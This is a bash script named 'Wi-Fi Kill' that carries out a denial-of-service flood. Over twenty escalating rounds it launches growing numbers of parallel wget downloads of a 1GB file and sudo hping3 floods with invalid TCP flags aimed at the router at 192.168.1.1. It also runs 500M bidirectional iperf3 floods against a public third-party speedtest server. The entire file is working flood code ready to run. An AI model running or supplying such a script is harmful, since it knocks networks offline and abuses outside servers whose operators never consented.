#!/bin/bash

ROUTER_IP="192.168.1.1"
IFACE="wlp1s0"
WGET_URL="http://speedtest.tele2.net/1GB.zip"

echo " Wi-Fi Kill starting..."

for round in {1..20}; do
  echo "ROUND $round: Launching $((round*10)) wget + $((round*5)) hping + iperf3"

  # Massive WGET stress
  for i in $(seq 1 $((round*10))); do
    wget $WGET_URL -O /dev/null &
  done

  # TCP flood with invalid flags (kernel choking)
  for i in $(seq 1 $((round*5))); do
    sudo hping3 --flood -p 80 -M 12345 -F -P -U $ROUTER_IP -I $IFACE &
  done

  # IPERF3 max bandwidth flood (both directions)
  for i in $(seq 1 $((round*2))); do
    iperf3 -c speedtest.milkywan.fr -b 500M -t 60 &
    iperf3 -R -c speedtest.milkywan.fr -b 500M -t 60 &
  done

  sleep 30  # Wait and observe before next ramp
done

